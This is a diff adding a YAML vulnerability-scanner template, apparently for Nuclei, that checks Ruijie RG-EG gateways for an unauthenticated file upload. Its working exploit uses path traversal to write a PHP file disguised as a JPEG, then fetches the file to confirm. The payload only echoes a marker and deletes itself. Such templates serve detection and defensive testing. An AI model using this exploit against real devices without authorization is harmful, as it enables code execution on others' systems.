@@ -1,0 +1,33 @@
+id: yaml-poc-ruijie-rg_eg-file_upload-CT-529878
+info:
+  name: Yaml Poc Ruijie Rg_Eg File_Upload Ct 529878
+  author: 2husky
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-ruijie-rg_eg-file_upload-CT-529878'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /ddi/server/fileupload.php?uploadDir=../../&name={{s2}}.php
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"file\"; filename=\"{{s2}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\
+    \ echo \"{{s1}}\"; unlink(__FILE__); ?>\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{s2}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
